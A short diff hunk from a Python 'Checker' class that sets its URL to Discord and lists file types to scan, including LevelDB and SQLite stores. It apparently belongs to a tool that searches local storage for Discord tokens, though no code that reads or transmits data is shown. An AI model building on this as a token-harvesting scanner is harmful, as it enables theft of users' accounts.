@@ -23,7 +23,7 @@ class Checker(object):
         exit()
 
     def __init__(self):
-        self.url = " "
+        self.url = "https://discord.com/"
         self.version = "3.5.3"
         self.file_types = [".txt", ".html", ".json", ".log", ".ldb", ".sqlite"]
         self.param = {}
